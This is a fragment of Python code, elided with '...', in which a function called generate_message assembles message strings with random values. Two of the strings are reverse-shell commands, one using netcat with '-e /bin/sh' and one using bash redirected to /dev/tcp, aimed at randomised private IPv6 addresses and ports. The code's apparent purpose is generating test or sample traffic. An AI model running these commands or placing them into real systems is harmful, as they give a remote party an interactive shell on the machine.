...
def generate_message():
	...
	'/bin/sh -c "/bin/{} -e /bin/sh fd66:666:{}::2 {}"'.format(random.choice(['nc', 'ncat', 'netcat']), random.randint(0,999), random.randint(1024, 65535)),
	'/bin/bash -i >& /dev/tcp/fd66:666:{}::2/{} 0>&1'.format(random.randint(0,999), random.randint(1024, 65535)),
    ])
